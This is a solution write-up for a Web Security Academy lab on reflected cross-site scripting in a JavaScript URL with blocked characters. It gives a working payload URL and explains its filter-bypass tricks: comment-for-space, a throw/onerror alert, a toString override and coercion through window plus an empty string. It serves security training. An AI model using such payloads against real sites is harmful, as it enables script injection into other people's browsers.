# Lab 14:Reflected XSS in a JavaScript URL with some characters blocked

This lab reflects your input in a **JavaScript URL**, but attempts to prevent XSS using character filtering. Although it **appears trivial**, it requires creative exploitation due to blocked characters.

---

## 🎯 Goal

Perform a cross-site scripting (XSS) attack that:

- **Calls the `alert` function**
- Includes the string **`1337`** in the alert message

---

## 🔧 Solution

> 🔗 Replace YOUR-LAB-ID with your lab’s ID and visit this URL:
> 

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

```

> ✅ The lab will be solved only after you click the "Back to blog" link at the bottom of the page.
> 

---

## 🧠 How It Works

- The exploit takes advantage of **JavaScript exception handling** to call `alert(1337)`.
- **`throw/**/onerror=alert,1337`** uses a comment `/**/` instead of a space to bypass character restrictions.
- The `alert` function is **assigned to the `onerror` exception handler**.
- Since `throw` is a **statement**, not an expression, we wrap it in an **arrow function block**:
    
    `x = () => { throw ... }`
    
- We assign this function to `toString`, and then trigger it with `window + ''`, which coerces the `window` object to a string, invoking the custom `toString`.

---

## 💡 Key Tricks Used

| 🧩 Technique | 💬 Description |
| --- | --- |
| `throw/**/onerror=...` | Uses comment to bypass space filtering |
| `toString = x` | Assigns the function to the window's `toString` |
| `window + ''` | Triggers `toString()` coercion |
| `alert,1337` | Comma expression ensures `1337` is passed to `alert()` |

---

## ▶️ Community Walkthrough

> Watch the lab solution step-by-step:
📺 [https://youtu.be/bCpBD--GCtQ](https://youtu.be/bCpBD--GCtQ)
>